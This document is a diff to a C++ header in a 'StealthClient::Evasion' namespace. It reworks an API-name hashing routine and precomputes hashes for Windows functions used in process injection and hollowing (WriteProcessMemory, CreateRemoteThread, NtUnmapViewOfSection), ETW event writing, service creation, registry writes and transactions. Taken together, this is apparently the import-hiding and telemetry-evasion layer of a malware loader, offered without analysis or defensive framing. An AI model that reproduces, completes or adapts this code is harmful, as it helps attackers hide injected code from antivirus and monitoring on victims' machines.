@@ -3,22 +3,22 @@
 #include <string>
 #include <unordered_map>
 #include <functional>
+#include <cstdint>
 
 namespace StealthClient {
 namespace Evasion {
 
 // Custom hash function for API names
-constexpr uint32_t HashString(const char* str) {
+inline uint32_t HashString(const char* str) {
     uint32_t hash = 5381;
-    int c;
-    while ((c = *str++)) {
-        hash = ((hash << 5) + hash) + c;
+    while (*str) {
+        hash = ((hash << 5) + hash) + static_cast<uint32_t>(*str++);
     }
     return hash;
 }
 
 // Macro for compile-time string hashing
-#define HASH_API(name) (HashString(name))
+#define HashString(name) (HashString(name))
 
 class DynamicAPIResolver {
 private:
@@ -63,59 +63,59 @@ extern DynamicAPIResolver g_APIResolver;
 
 // Common API hashes
 namespace APIHashes {
-    constexpr uint32_t KERNEL32 = HASH_API("kernel32.dll");
-    constexpr uint32_t NTDLL = HASH_API("ntdll.dll");
-    constexpr uint32_t USER32 = HASH_API("user32.dll");
-    constexpr uint32_t ADVAPI32 = HASH_API("advapi32.dll");
+    static const uint32_t KERNEL32 = HashString("kernel32.dll");
+    static const uint32_t NTDLL = HashString("ntdll.dll");
+    static const uint32_t USER32 = HashString("user32.dll");
+    static const uint32_t ADVAPI32 = HashString("advapi32.dll");
     
     // Kernel32 functions
-    constexpr uint32_t VIRTUAL_ALLOC = HASH_API("VirtualAlloc");
-    constexpr uint32_t VIRTUAL_FREE = HASH_API("VirtualFree");
-    constexpr uint32_t VIRTUAL_PROTECT = HASH_API("VirtualProtect");
-    constexpr uint32_t CREATE_PROCESS = HASH_API("CreateProcessA");
-    constexpr uint32_t OPEN_PROCESS = HASH_API("OpenProcess");
-    constexpr uint32_t WRITE_PROCESS_MEMORY = HASH_API("WriteProcessMemory");
-    constexpr uint32_t READ_PROCESS_MEMORY = HASH_API("ReadProcessMemory");
-    constexpr uint32_t CREATE_REMOTE_THREAD = HASH_API("CreateRemoteThread");
-    constexpr uint32_t LOAD_LIBRARY = HASH_API("LoadLibraryA");
-    constexpr uint32_t GET_PROC_ADDRESS = HASH_API("GetProcAddress");
+    static const uint32_t VIRTUAL_ALLOC = HashString("VirtualAlloc");
+    static const uint32_t VIRTUAL_FREE = HashString("VirtualFree");
+    static const uint32_t VIRTUAL_PROTECT = HashString("VirtualProtect");
+    static const uint32_t CREATE_PROCESS = HashString("CreateProcessA");
+    static const uint32_t OPEN_PROCESS = HashString("OpenProcess");
+    static const uint32_t WRITE_PROCESS_MEMORY = HashString("WriteProcessMemory");
+    static const uint32_t READ_PROCESS_MEMORY = HashString("ReadProcessMemory");
+    static const uint32_t CREATE_REMOTE_THREAD = HashString("CreateRemoteThread");
+    static const uint32_t LOAD_LIBRARY = HashString("LoadLibraryA");
+    static const uint32_t GET_PROC_ADDRESS = HashString("GetProcAddress");
     
     // Ntdll functions
-    constexpr uint32_t NT_ALLOCATE_VIRTUAL_MEMORY = HASH_API("NtAllocateVirtualMemory");
-    constexpr uint32_t NT_FREE_VIRTUAL_MEMORY = HASH_API("NtFreeVirtualMemory");
-    constexpr uint32_t NT_PROTECT_VIRTUAL_MEMORY = HASH_API("NtProtectVirtualMemory");
-    constexpr uint32_t NT_WRITE_VIRTUAL_MEMORY = HASH_API("NtWriteVirtualMemory");
-    constexpr uint32_t NT_READ_VIRTUAL_MEMORY = HASH_API("NtReadVirtualMemory");
-    constexpr uint32_t NT_CREATE_THREAD_EX = HASH_API("NtCreateThreadEx");
-    constexpr uint32_t NT_UNMAP_VIEW_OF_SECTION = HASH_API("NtUnmapViewOfSection");
-    constexpr uint32_t NT_QUERY_INFORMATION_PROCESS = HASH_API("NtQueryInformationProcess");
-    constexpr uint32_t NT_SET_INFORMATION_PROCESS = HASH_API("NtSetInformationProcess");
+    static const uint32_t NT_ALLOCATE_VIRTUAL_MEMORY = HashString("NtAllocateVirtualMemory");
+    static const uint32_t NT_FREE_VIRTUAL_MEMORY = HashString("NtFreeVirtualMemory");
+    static const uint32_t NT_PROTECT_VIRTUAL_MEMORY = HashString("NtProtectVirtualMemory");
+    static const uint32_t NT_WRITE_VIRTUAL_MEMORY = HashString("NtWriteVirtualMemory");
+    static const uint32_t NT_READ_VIRTUAL_MEMORY = HashString("NtReadVirtualMemory");
+    static const uint32_t NT_CREATE_THREAD_EX = HashString("NtCreateThreadEx");
+    static const uint32_t NT_UNMAP_VIEW_OF_SECTION = HashString("NtUnmapViewOfSection");
+    static const uint32_t NT_QUERY_INFORMATION_PROCESS = HashString("NtQueryInformationProcess");
+    static const uint32_t NT_SET_INFORMATION_PROCESS = HashString("NtSetInformationProcess");
     
     // User32 functions
-    constexpr uint32_t MESSAGE_BOX = HASH_API("MessageBoxA");
-    constexpr uint32_t FIND_WINDOW = HASH_API("FindWindowA");
-    constexpr uint32_t GET_WINDOW_THREAD_PROCESS_ID = HASH_API("GetWindowThreadProcessId");
+    static const uint32_t MESSAGE_BOX = HashString("MessageBoxA");
+    static const uint32_t FIND_WINDOW = HashString("FindWindowA");
+    static const uint32_t GET_WINDOW_THREAD_PROCESS_ID = HashString("GetWindowThreadProcessId");
     
     // Advapi32 functions
-    constexpr uint32_t OPEN_SC_MANAGER = HASH_API("OpenSCManagerA");
-    constexpr uint32_t CREATE_SERVICE = HASH_API("CreateServiceA");
-    constexpr uint32_t START_SERVICE = HASH_API("StartServiceA");
-    constexpr uint32_t REG_OPEN_KEY = HASH_API("RegOpenKeyExA");
-    constexpr uint32_t REG_SET_VALUE = HASH_API("RegSetValueExA");
-    constexpr uint32_t REG_QUERY_VALUE = HASH_API("RegQueryValueExA");
-    constexpr uint32_t ETW_EVENT_WRITE = HASH_API("EtwEventWrite");
-    constexpr uint32_t ETW_EVENT_WRITE_EX = HASH_API("EtwEventWriteEx");
-    constexpr uint32_t ETW_EVENT_WRITE_STRING = HASH_API("EtwEventWriteString");
-    constexpr uint32_t ETW_EVENT_WRITE_TRANSFER = HASH_API("EtwEventWriteTransfer");
+    static const uint32_t OPEN_SC_MANAGER = HashString("OpenSCManagerA");
+    static const uint32_t CREATE_SERVICE = HashString("CreateServiceA");
+    static const uint32_t START_SERVICE = HashString("StartServiceA");
+    static const uint32_t REG_OPEN_KEY = HashString("RegOpenKeyExA");
+    static const uint32_t REG_SET_VALUE = HashString("RegSetValueExA");
+    static const uint32_t REG_QUERY_VALUE = HashString("RegQueryValueExA");
+    static const uint32_t ETW_EVENT_WRITE = HashString("EtwEventWrite");
+    static const uint32_t ETW_EVENT_WRITE_EX = HashString("EtwEventWriteEx");
+    static const uint32_t ETW_EVENT_WRITE_STRING = HashString("EtwEventWriteString");
+    static const uint32_t ETW_EVENT_WRITE_TRANSFER = HashString("EtwEventWriteTransfer");
     
     // Additional Ntdll functions
-    constexpr uint32_t NT_TRACE_EVENT = HASH_API("NtTraceEvent");
-    constexpr uint32_t NT_TRACE_CONTROL = HASH_API("NtTraceControl");
+    static const uint32_t NT_TRACE_EVENT = HashString("NtTraceEvent");
+    static const uint32_t NT_TRACE_CONTROL = HashString("NtTraceControl");
     
     // Transaction functions
-    constexpr uint32_t CREATE_TRANSACTION = HASH_API("CreateTransaction");
-    constexpr uint32_t COMMIT_TRANSACTION = HASH_API("CommitTransaction");
-    constexpr uint32_t ROLLBACK_TRANSACTION = HASH_API("RollbackTransaction");
+    static const uint32_t CREATE_TRANSACTION = HashString("CreateTransaction");
+    static const uint32_t COMMIT_TRANSACTION = HashString("CommitTransaction");
+    static const uint32_t ROLLBACK_TRANSACTION = HashString("RollbackTransaction");
 }
 
 } // namespace Evasion
